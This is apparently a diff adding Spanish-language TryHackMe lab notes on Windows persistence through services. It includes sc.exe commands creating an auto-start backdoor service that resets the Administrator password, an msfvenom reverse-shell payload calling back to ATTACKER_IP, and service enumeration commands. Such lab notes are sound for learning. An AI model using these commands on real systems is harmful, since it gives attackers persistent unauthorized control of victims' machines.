@@ -174,4 +174,46 @@ nc -lvp 4445
 
 # Abusar servicios
 
+Otra opción es configurando o ejecutando un servicio por debajo en la máquina víctima.
+
+El servicio simplemente es un ejecutable que funciona en un background. Cuando configuramos el servicio, definimos como se va a ejecutar y usar y automaticamente podemos ejecutarlo o manualmente.
+
+## CREACION DE UN BACKDOOR
+
+```
+sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
+sc.exe start THMservice
+```
+
+Creamos el servicio "THMservice"
+
+El "net user" hace que cuando se ejecute el servicio se resetee la contraseña a Passwd123. Y automaticamente se inicia
+
+podemos crear también si queremos una rev shell ejecutable
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
+```
+Y simplemente lo ejecutamos o ponemos la ruta
+
+
+```
+sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
+sc.exe start THMservice2
+```
+
+## Modificar servicios existentes
+
+Mientras creamos nuevos servicios, el blue team puede ver que hemos creado un servicio, podemos listar servicios 
+
+```
+sc.exe query state=all
+```
+
+```
+sc.exe qc servicioç
+```
+
+
+
 
